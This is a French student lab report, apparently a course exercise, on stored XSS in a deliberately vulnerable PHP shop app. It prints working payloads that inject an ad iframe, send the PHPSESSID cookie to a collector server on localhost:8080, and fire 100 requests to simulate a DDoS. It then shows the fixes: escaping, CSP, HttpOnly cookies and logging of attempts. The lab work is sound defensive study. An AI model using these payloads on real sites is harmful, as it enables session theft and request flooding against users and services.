@@ -1,0 +1,86 @@
+# TP Sécurité : Partie I - XSS
+
+## Intro
+J’ai fait le TP sur XSS pour comprendre comment ça marche, ses dangers, et comment se protéger. J’ai créé une appli web avec XAMPP (PHP, MySQL) qui simule une boutique avec login et commentaires. J’ai testé des attaques XSS (pub, vol de cookies, botnet), ajouté des protections, et analysé les logs.
+
+## Étape 1 : Créer l’appli
+- But : Faire une appli vulnérable à XSS.
+- Comment :
+  - XAMPP sur Windows, PHP et MySQL.
+  - Base `secur_app` avec tables `users` (id, username, password) et `comments` (id, article_id, content).
+  - Fichiers : `login.php` (connexion), `index.php` (accueil), `logout.php` (déconnexion), `article.php` (article + commentaires).
+- Résultat : Appli OK à `http://localhost/tp_security`. Login OK avec `admin`/`password123`. Commentaires affichés sans filtre.
+- **Figure 1** : Page `article.php` avec un commentaire.
+
+## Étape 2 : XSS pour pub
+- But : Injecter un script pour afficher une pub.
+- Comment :
+  - Créé `pub.html` dans `C:\xampp\htdocs` (accessible à `http://localhost/securitye_app/pub.html`).
+  - Injecté dans `article.php?id=1` :
+    ```html
+    <script>
+        document.body.innerHTML += '<iframe src="http://localhost/pub.html" width="300" height="200"></iframe>';
+    </script>
+    ```
+- Résultat : Iframe de pub s’affiche à chaque visite (XSS stocké).
+- **Figure 2** : Page avec iframe de pub.
+
+## Étape 3 : XSS pour voler cookies
+- But : Voler le cookie `PHPSESSID`.
+- Comment :
+  - Serveur Python `steal_cookies.py` sur `http://localhost:8080`, enregistre dans `stolen_cookies.txt`.
+  - Injecté :
+    ```html
+    <script>
+        window.location = 'http://localhost:8080?cookie=' + encodeURIComponent(document.cookie);
+    </script>
+    ```
+- Résultat : Fichier `stolen_cookies.txt` montre :
+  ```
+  cookie=test
+  cookie=_xsrf%3D2%7Cd965fcf6%7C49b28a97a8386d77cf1ab861d0ba2c43%7C1753211649%3B%20PHPSESSID%3Dak5hu8490l0c7p5g1guuo7akfr
+  ```
+  Cookie `PHPSESSID` volé.
+- **Figure 3** : Contenu de `stolen_cookies.txt`.
+
+## Étape 4 : Protéger l’appli
+- But : Bloquer les XSS.
+- Comment :
+  - Ajouté `htmlspecialchars` dans `article.php` pour échapper les commentaires.
+  - Ajouté CSP : `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`.
+  - Ajouté `HttpOnly` dans `login.php` avec `ini_set('session.cookie_httponly', 1)`.
+  - Retesté attaques.
+- Résultat : Scripts affichés comme texte, pas d’iframe, pas de cookies volés.
+- **Figure 4** : Script XSS comme texte brut.
+
+## Étape 5 : Vérifier les logs
+- But : Trouver les tentatives XSS.
+- Comment :
+  - Vérifié `C:\xampp\apache\logs\access.log` (montre requêtes POST).
+  - Ajouté log dans `article.php` pour `<script>` dans `xss_attempts.log`.
+  - Injecté `<script>alert('XSS');</script>`.
+- Résultat : `xss_attempts.log` montre :
+  ```
+  2025-08-05 22:04:XX : <script>alert('XSS');</script>
+  ```
+- **Figure 5** : Contenu de `xss_attempts.log`.
+
+## Extension : Botnet
+- But : Simuler un DDoS avec XSS.
+- Comment :
+  - Désactivé `htmlspecialchars` et CSP.
+  - Injecté :
+    ```html
+    <script>
+    for (let i = 0; i < 100; i++) {
+        fetch("http://localhost:8081/?r=" + Math.random());
+    }
+    </script>
+    ```
+  - Serveur Python `target_server.py` sur `http://localhost:8081`, log dans `target_requests.log`.
+  - Retesté après protections.
+- Résultat : 100 requêtes dans `target_requests.log`. Après protections, script bloqué.
+- **Figure 6** : Contenu de `target_requests.log`.
+
+## Conclusion
+J’ai appris que XSS peut afficher des pubs, voler des sessions, ou créer des botnets. Sans protection, l’appli était vulnérable. Avec `htmlspecialchars`, CSP, et `HttpOnly`, les attaques sont bloquées. Les logs aident à détecter les attaques. Ça montre pourquoi sécuriser les entrées est crucial (OWASP A03:2021).
